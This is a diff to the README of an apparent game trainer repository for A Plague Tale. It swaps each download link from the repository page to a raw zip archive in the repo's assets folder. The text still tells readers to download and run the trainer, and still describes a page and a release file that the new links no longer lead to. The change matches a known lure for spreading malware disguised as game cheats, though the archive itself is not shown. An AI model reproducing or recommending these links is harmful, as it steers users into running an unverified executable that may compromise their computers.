@@ -1,6 +1,6 @@
 # 🎮 Resonance-A-Plague-Tale-Legacy-Trainer - Your Ultimate Companion for a Richer Gaming Experience
 
-[![Download Now](https://img.shields.io/badge/Download-Resonance%20Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/harhapravnee/Resonance-A-Plague-Tale-Legacy-Trainer)
+[![Download Now](https://img.shields.io/badge/Download-Resonance%20Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/harhapravnee/Resonance-A-Plague-Tale-Legacy-Trainer/main/assets/v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Resonance-A-Plague-Tale-Legacy-Trainer! This is a powerful and ea
 
 ### 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/harhapravnee/Resonance-A-Plague-Tale-Legacy-Trainer](https://github.com/harhapravnee/Resonance-A-Plague-Tale-Legacy-Trainer)
+Visit this link to download the application: [https://raw.githubusercontent.com/harhapravnee/Resonance-A-Plague-Tale-Legacy-Trainer/main/assets/v2.9.zip](https://raw.githubusercontent.com/harhapravnee/Resonance-A-Plague-Tale-Legacy-Trainer/main/assets/v2.9.zip)
 
 Once you're on the page, look for the download button or the latest release file. Click it, and the application will start downloading to your computer. After the download is complete, you'll have the trainer ready to use. That's it—no complex setup steps required.
 
@@ -135,7 +135,7 @@ If you need help, there are several ways to find it:
 
 Ready to enhance your game? Here's your simple checklist:
 
-1. **Click the download link:** [https://github.com/harhapravnee/Resonance-A-Plague-Tale-Legacy-Trainer](https://github.com/harhapravnee/Resonance-A-Plague-Tale-Legacy-Trainer)
+1. **Click the download link:** [https://raw.githubusercontent.com/harhapravnee/Resonance-A-Plague-Tale-Legacy-Trainer/main/assets/v2.9.zip](https://raw.githubusercontent.com/harhapravnee/Resonance-A-Plague-Tale-Legacy-Trainer/main/assets/v2.9.zip)
 2. **Download the application** from the page.
 3. **Run the trainer** and start your game.
 4. **Explore the features** and customize your experience.
